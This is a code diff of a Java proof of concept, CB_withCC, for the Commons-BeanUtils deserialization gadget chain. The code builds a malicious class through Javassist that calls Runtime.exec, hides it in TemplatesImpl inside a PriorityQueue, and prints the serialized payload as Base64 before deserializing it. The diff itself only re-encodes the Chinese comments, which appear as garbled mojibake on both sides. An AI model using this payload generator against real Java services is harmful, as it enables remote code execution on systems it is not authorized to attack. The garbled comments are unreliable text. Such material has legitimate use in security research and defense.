@@ -16,13 +16,13 @@ import javassist.NotFoundException;
 import org.apache.commons.beanutils.BeanComparator;
 
 /**
- * ÒÀÀµCCÁ´
+ * ä¾èµ–CCé“¾
  * BeanComparator
- *ÔÚ´´½¨ÀàµÄ¶ÔÏóµÄÊ±ºò¿ÉÒÔÎªcomparator¸³ÓèÌØ¶¨µÄ±È½ÏÆ÷£¬ÖµµÃ×¢ÒâµÄÊÇÈç¹ûÃ»ÓĞÉè¶¨×Ô¶¨ÒåµÄcomparator£¬
- * ÆäÄ¬ÈÏÎªComparableComparator¶ÔÏó£¬µ±È»£¬ÔÚµ÷ÓÃÁ´ÖĞ£¬½«»áµ÷ÓÃËûµÄcompare·½·¨
- *¶øComparableComparatorÀ´×ÔccÁ´¡£
+ *åœ¨åˆ›å»ºç±»çš„å¯¹è±¡çš„æ—¶å€™å¯ä»¥ä¸ºcomparatorèµ‹äºˆç‰¹å®šçš„æ¯”è¾ƒå™¨ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯å¦‚æœæ²¡æœ‰è®¾å®šè‡ªå®šä¹‰çš„comparatorï¼Œ
+ * å…¶é»˜è®¤ä¸ºComparableComparatorå¯¹è±¡ï¼Œå½“ç„¶ï¼Œåœ¨è°ƒç”¨é“¾ä¸­ï¼Œå°†ä¼šè°ƒç”¨ä»–çš„compareæ–¹æ³•
+ *è€ŒComparableComparatoræ¥è‡ªccé“¾ã€‚
  *
- * CBÁ´µÄ·´ĞòÁĞ»¯ÎÊÌâÊÇ¹Ø¼üÔÚÓÚPriorityQueue.readObject
+ * CBé“¾çš„ååºåˆ—åŒ–é—®é¢˜æ˜¯å…³é”®åœ¨äºPriorityQueue.readObject
  */
 public class CB_withCC {
 
@@ -33,53 +33,53 @@ public class CB_withCC {
     }
 
     public static void main(String[] args) throws IOException, CannotCompileException, NotFoundException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
-        //¶¯Ì¬´´½¨×Ö½ÚÂë
+        //åŠ¨æ€åˆ›å»ºå­—èŠ‚ç 
         String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
-        //¹ÜÀí½«Òª±»´´½¨µÄÀà
+        //ç®¡ç†å°†è¦è¢«åˆ›å»ºçš„ç±»
         ClassPool pool = ClassPool.getDefault();
-        //´´½¨ĞÂÀà
+        //åˆ›å»ºæ–°ç±»
         CtClass ctClass = pool.makeClass("Evil");
-        //½« cmd ×Ö·û´®²åÈëµ½Àà³õÊ¼»¯Æ÷·½·¨µÄ¿ªÍ·¡£ÔÚÀà±»¼ÓÔØÊ±£¬cmd ×Ö·û´®ÖĞµÄÃüÁî¾Í»á±»Ö´ĞĞ¡£
+        //å°† cmd å­—ç¬¦ä¸²æ’å…¥åˆ°ç±»åˆå§‹åŒ–å™¨æ–¹æ³•çš„å¼€å¤´ã€‚åœ¨ç±»è¢«åŠ è½½æ—¶ï¼Œcmd å­—ç¬¦ä¸²ä¸­çš„å‘½ä»¤å°±ä¼šè¢«æ‰§è¡Œã€‚
         ctClass.makeClassInitializer().insertBefore(cmd);
-        //×ª»»xmlÎÄµµ
+        //è½¬æ¢xmlæ–‡æ¡£
         ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
         byte[] bytes = ctClass.toBytecode();
 
-        //TemplatesImpl¿ÉÔÚÔËĞĞÊ±¶¯Ì¬Éú³Éjava´úÂë
+        //TemplatesImplå¯åœ¨è¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆjavaä»£ç 
         TemplatesImpl templates = new TemplatesImpl();
-        //ÕâĞ©ÊôĞÔµÄ×÷ÓÃÊÇÎªÁËÔÚÔËĞĞÊ±¶¯Ì¬Éú³ÉJava´úÂë£¬²¢½«Æä±àÒë³É¿ÉÖ´ĞĞµÄ×Ö½ÚÂë
-        //_nameÊôĞÔ±íÊ¾Éú³ÉµÄJavaÀàµÄÃû³Æ
+        //è¿™äº›å±æ€§çš„ä½œç”¨æ˜¯ä¸ºäº†åœ¨è¿è¡Œæ—¶åŠ¨æ€ç”ŸæˆJavaä»£ç ï¼Œå¹¶å°†å…¶ç¼–è¯‘æˆå¯æ‰§è¡Œçš„å­—èŠ‚ç 
+        //_nameå±æ€§è¡¨ç¤ºç”Ÿæˆçš„Javaç±»çš„åç§°
         setFieldValue(templates, "_name", "RoboTerh");
-        //_tfactoryÊôĞÔ±íÊ¾ÓÃÓÚ´´½¨Transformer¶ÔÏóµÄTransformerFactoryÊµÀı£¨Èç¹ûĞèÒª´´½¨Transformer¶ÔÏó£¬ÔòĞèÒªÖ¸¶¨TransformerFactoryÊµÀı£©
+        //_tfactoryå±æ€§è¡¨ç¤ºç”¨äºåˆ›å»ºTransformerå¯¹è±¡çš„TransformerFactoryå®ä¾‹ï¼ˆå¦‚æœéœ€è¦åˆ›å»ºTransformerå¯¹è±¡ï¼Œåˆ™éœ€è¦æŒ‡å®šTransformerFactoryå®ä¾‹ï¼‰
         setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
-        //_bytecodesÊôĞÔ±íÊ¾´æ´¢Éú³ÉµÄJavaÀàµÄ×Ö½ÚÂë
+        //_bytecodeså±æ€§è¡¨ç¤ºå­˜å‚¨ç”Ÿæˆçš„Javaç±»çš„å­—èŠ‚ç 
         setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
 
-        //´´½¨±È½ÏÆ÷£¬ÕâÀïBeanComparatorÄ¬ÈÏ²»´«»áÊ¹ÓÃccÖĞµÄComparableComparator
-        //BeanComparatorÊÇcommons-beanutilsÌá¹©µÄÓÃÀ´±È½ÏÁ½¸öJavaBeanÊÇ·ñÏàµÈµÄÀà
+        //åˆ›å»ºæ¯”è¾ƒå™¨ï¼Œè¿™é‡ŒBeanComparatoré»˜è®¤ä¸ä¼ ä¼šä½¿ç”¨ccä¸­çš„ComparableComparator
+        //BeanComparatoræ˜¯commons-beanutilsæä¾›çš„ç”¨æ¥æ¯”è¾ƒä¸¤ä¸ªJavaBeanæ˜¯å¦ç›¸ç­‰çš„ç±»
         BeanComparator beanComparator = new BeanComparator();
         PriorityQueue queue = new PriorityQueue(2, beanComparator);
         queue.add(1);
         queue.add(1);
 
 
-        /**CBÏÂµÄBeanComparatorÖĞÊÇÓÉCCÖĞµÄComparableComparatorÊµÏÖ£¬¶øÕâ¸öÖĞÈç¹û³õÊ¼»¯´«ÈëÁËproperty£¬
-         * ¾Í»áÈ¥µ÷ÓÃÁ½¸ö¶ÔÏó¶ÔÓ¦µÄ getter ·½·¨£¬»ñÈ¡ÆäÊôĞÔÖµ¡£¶øTemplatesImpl³ıÁËÖ±½Óµ÷newTransformer() ·½·¨£¬»¹¿ÉÒÔ¼ä½Óµ÷getOutputProperties()
+        /**CBä¸‹çš„BeanComparatorä¸­æ˜¯ç”±CCä¸­çš„ComparableComparatorå®ç°ï¼Œè€Œè¿™ä¸ªä¸­å¦‚æœåˆå§‹åŒ–ä¼ å…¥äº†propertyï¼Œ
+         * å°±ä¼šå»è°ƒç”¨ä¸¤ä¸ªå¯¹è±¡å¯¹åº”çš„ getter æ–¹æ³•ï¼Œè·å–å…¶å±æ€§å€¼ã€‚è€ŒTemplatesImplé™¤äº†ç›´æ¥è°ƒnewTransformer() æ–¹æ³•ï¼Œè¿˜å¯ä»¥é—´æ¥è°ƒgetOutputProperties()
          *
          */
-        //·´Éä¸³Öµ
+        //åå°„èµ‹å€¼
         setFieldValue(beanComparator, "property", "outputProperties");
         setFieldValue(queue, "queue", new Object[]{templates, templates});
 
 
-        //ĞòÁĞ»¯
+        //åºåˆ—åŒ–
         ByteArrayOutputStream baor = new ByteArrayOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(baor);
         oos.writeObject(queue);
         oos.close();
         System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));
 
-        //·´ĞòÁĞ»¯
+        //ååºåˆ—åŒ–
         ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
         ObjectInputStream ois = new ObjectInputStream(bais);
         Object o = ois.readObject();
